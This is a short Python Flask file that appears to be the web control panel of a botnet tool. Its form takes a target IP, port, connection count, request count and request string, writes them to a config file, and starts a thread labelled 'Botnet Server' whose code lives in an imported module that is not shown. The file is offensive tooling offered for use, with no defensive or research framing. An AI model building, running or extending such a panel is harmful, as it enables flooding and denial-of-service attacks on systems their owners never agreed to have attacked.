from flask import Flask, request, render_template
import threading
from gui.server_run import ServerRunner



app = Flask(__name__, static_folder="gui/static", template_folder="gui/templates")

@app.route('/', methods=['GET', 'POST'])
def get_data():
    if request.method == 'POST':
        file = open("conf.txt","w")
        file.write("IP:" + request.form['ip_address'])
        file.write("\n")
        file.write("Port: " + request.form['port'])
        file.write("\n")
        file.write("ConnN:" + request.form['conn_number'])
        file.write("\n")
        file.write("ReqN:" + request.form['req_number'])
        file.write("\n")
        file.write("Req:" + request.form['requ'])
        file.close()

        # Start Botnet Server
        srv_run = ServerRunner()
        thread = threading.Thread(target=srv_run.run_server, args=())
        thread.daemon = True
        thread.start()

        return render_template('good.html')
    else:
        return render_template('main.html')

if __name__ == '__main__':
    app.run()
